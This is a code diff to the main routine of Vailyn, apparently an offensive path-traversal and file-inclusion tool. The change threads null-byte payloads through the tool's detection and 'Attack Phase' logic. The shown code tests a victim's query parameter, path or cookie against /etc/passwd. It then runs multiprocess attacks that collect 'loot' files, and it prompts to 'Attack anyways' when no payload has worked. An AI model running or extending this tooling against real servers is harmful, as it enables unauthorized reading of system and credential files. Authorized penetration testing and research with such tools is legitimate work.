@@ -73,6 +73,7 @@ def main() -> int:
     foundfiles = [""]
     foundurls = [""]
     foundpayloads = []
+    foundnullbytes = []
     vlnfile = "/etc/passwd"
     checkdepth = 8
 
@@ -126,8 +127,9 @@ def main() -> int:
         with Pool(processes=processes) as pool:
             res = [pool.apply_async(determine_payloads_query, args=(args.victim,victim2,args.param,verbose,checkdepth,l,vlnfile,)) for l in paysplit]
             for i in res:
-                pays = i.get()
-                foundpayloads += pays
+                tuples = i.get()
+                foundpayloads += tuples[0]
+                foundnullbytes += tuples[1]
                 
         ending_time = time.time()
         vuln_time = ending_time - starting_time
@@ -136,17 +138,22 @@ def main() -> int:
         if foundpayloads:
             attack = True
             selectedpayloads = select(foundpayloads)
+            if foundnullbytes:
+                selectednullbytes = select(foundnullbytes)
+            else:
+                selectednullbytes = []
         else:
             cont = input("[!] No payload succeeded. Attack anyways? (enter if not) :> ")
             if cont != "":
                 attack = True
                 selectedpayloads = payloadlist
+                selectednullbytes = nullchars
         #start the attack
         starting_time = time.time()
         if attack:
             print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Attack Phase\n'.format(color.RD, color.END))
             with Pool(processes=processes) as pool:
-                res = [pool.apply_async(query, args=(args.victim,victim2,args.param,commons,l,depth,verbose,loot,summary,selectedpayloads,)) for l in splitted]
+                res = [pool.apply_async(query, args=(args.victim,victim2,args.param,commons,l,depth,verbose,loot,summary,selectedpayloads,selectednullbytes,)) for l in splitted]
                 for i in res:
                     restuple = i.get()
                     foundfiles += restuple[0]
@@ -164,8 +171,9 @@ def main() -> int:
         with Pool(processes=processes) as pool:
             res = [pool.apply_async(determine_payloads_inpath, args=(args.victim,victim2,args.param,verbose,checkdepth,l,vlnfile,)) for l in paysplit]
             for i in res:
-                pays = i.get()
-                foundpayloads += pays
+                tuples = i.get()
+                foundpayloads += tuples[0]
+                foundnullbytes += tuples[1]
                 
         ending_time = time.time()
         vuln_time = ending_time - starting_time
@@ -174,17 +182,22 @@ def main() -> int:
         if foundpayloads:
             attack = True
             selectedpayloads = select(foundpayloads)
+            if foundnullbytes:
+                selectednullbytes = select(foundnullbytes)
+            else:
+                selectednullbytes = []
         else:
             cont = input("[!] No payload succeeded. Attack anyways? (enter if not) :> ")
             if cont != "":
                 attack = True
                 selectedpayloads = payloadlist
+                selectednullbytes = nullchars
         #start the attack
         starting_time = time.time()
         if attack:
             print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Attack Phase\n'.format(color.RD, color.END))
             with Pool(processes=processes) as pool:
-                res = [pool.apply_async(inpath, args=(args.victim,victim2,args.param,commons,l,depth,verbose,loot,summary,selectedpayloads,)) for l in splitted]
+                res = [pool.apply_async(inpath, args=(args.victim,victim2,args.param,commons,l,depth,verbose,loot,summary,selectedpayloads,selectednullbytes,)) for l in splitted]
                 for i in res:
                     restuple = i.get()
                     foundfiles += restuple[0]
@@ -205,8 +218,9 @@ def main() -> int:
         with Pool(processes=processes) as pool:
             res = [pool.apply_async(determine_payloads_cookie, args=(args.victim,cookie,selected,verbose,checkdepth,l,vlnfile,)) for l in paysplit]
             for i in res:
-                pays = i.get()
-                foundpayloads += pays
+                tuples = i.get()
+                foundpayloads += tuples[0]
+                foundnullbytes += tuples[1]
                 
         ending_time = time.time()
         vuln_time = ending_time - starting_time
@@ -215,17 +229,22 @@ def main() -> int:
         if foundpayloads:
             attack = True
             selectedpayloads = select(foundpayloads)
+            if foundnullbytes:
+                selectednullbytes = select(foundnullbytes)
+            else:
+                selectednullbytes = []
         else:
             cont = input("[!] No payload succeeded. Attack anyways? (enter if not) :> ")
             if cont != "":
                 attack = True
                 selectedpayloads = payloadlist
+                selectednullbytes = nullchars
         #start the attack
         starting_time = time.time()
         if attack:
             print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Attack Phase\n'.format(color.RD, color.END))
             with Pool(processes=processes) as pool:
-                res = [pool.apply_async(cookie_attack, args=(args.victim,cookie,selected,commons,l,depth,verbose,loot,summary,selectedpayloads,)) for l in splitted]
+                res = [pool.apply_async(cookie_attack, args=(args.victim,cookie,selected,commons,l,depth,verbose,loot,summary,selectedpayloads,selectednullbytes,)) for l in splitted]
                 for i in res:
                     restuple = i.get()
                     foundfiles += restuple[0]
